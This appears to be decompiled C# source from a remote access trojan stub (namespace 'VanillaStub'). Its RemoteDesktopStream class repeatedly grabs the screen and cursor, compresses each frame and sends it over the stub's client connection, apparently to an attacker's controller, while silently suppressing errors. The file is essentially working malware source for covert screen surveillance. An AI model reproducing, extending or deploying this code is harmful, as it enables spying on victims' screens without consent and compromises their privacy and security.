using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Threading;
using System.Windows.Forms;
using VanillaStub.Helpers.Networking;
using VanillaStub.Helpers.Services.StreamLibrary;
using VanillaStub.Helpers.Services.StreamLibrary.UnsafeCodecs;

namespace VanillaStub.Helpers.Services;

public static class RemoteDesktopStream
{
	private struct CursorInfo
	{
		public int cbSize;

		public readonly int flags;

		public readonly IntPtr hCursor;

		public readonly PointAPI ptScreenPos;
	}

	private struct PointAPI
	{
		public readonly int x;

		public readonly int y;
	}

	private const int CURSOR_SHOWING = 1;

	private static Thread RemoteDestkopThread = new Thread(StartRemoteDestkop);

	public static bool RemoteDesktopActive { get; set; }

	[DllImport("user32.dll")]
	private static extern bool GetCursorInfo(out CursorInfo pci);

	[DllImport("user32.dll")]
	private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	public static void Start()
	{
		if (!RemoteDesktopActive)
		{
			RemoteDesktopActive = true;
			try
			{
				RemoteDestkopThread.Start();
			}
			catch
			{
			}
		}
	}

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	public static void Stop()
	{
		if (RemoteDesktopActive)
		{
			RemoteDesktopActive = false;
			try
			{
				RemoteDestkopThread.Abort();
				RemoteDestkopThread = new Thread(StartRemoteDestkop);
			}
			catch
			{
			}
		}
	}

	private static async void StartRemoteDestkop()
	{
		while (RemoteDesktopActive)
		{
			byte[] collection = null;
			IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(50);
			Bitmap desktopImage = GetDesktopImage();
			Rectangle scanArea = new Rectangle(0, 0, ((Image)desktopImage).get_Width(), ((Image)desktopImage).get_Height());
			Size imageSize = new Size(((Image)desktopImage).get_Width(), ((Image)desktopImage).get_Height());
			BitmapData val = desktopImage.LockBits(new Rectangle(0, 0, ((Image)desktopImage).get_Width(), ((Image)desktopImage).get_Height()), (ImageLockMode)3, ((Image)desktopImage).get_PixelFormat());
			using (MemoryStream memoryStream = new MemoryStream(1000000000))
			{
				unsafeCodec.CodeImage(val.get_Scan0(), scanArea, imageSize, ((Image)desktopImage).get_PixelFormat(), memoryStream);
				collection = memoryStream.ToArray();
			}
			List<byte> list = new List<byte>();
			list.Add(0);
			list.AddRange(collection);
			VanillaStub.Helpers.Networking.Networking.MainClient.Send(list.ToArray());
			desktopImage.UnlockBits(val);
			((Image)desktopImage).Dispose();
		}
	}

	private static Bitmap GetDesktopImage()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
		try
		{
			Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)925707);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			val2.CopyFromScreen(0, 0, 0, 0, new Size(((Image)val).get_Width(), ((Image)val).get_Height()), (CopyPixelOperation)13369376);
			CursorInfo pci = default(CursorInfo);
			pci.cbSize = Marshal.SizeOf(typeof(CursorInfo));
			if (GetCursorInfo(out pci) && pci.flags == 1)
			{
				DrawIcon(val2.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
				val2.ReleaseHdc();
			}
			val2.Dispose();
			return val;
		}
		catch
		{
			return new Bitmap(bounds.Width, bounds.Height);
		}
	}
}
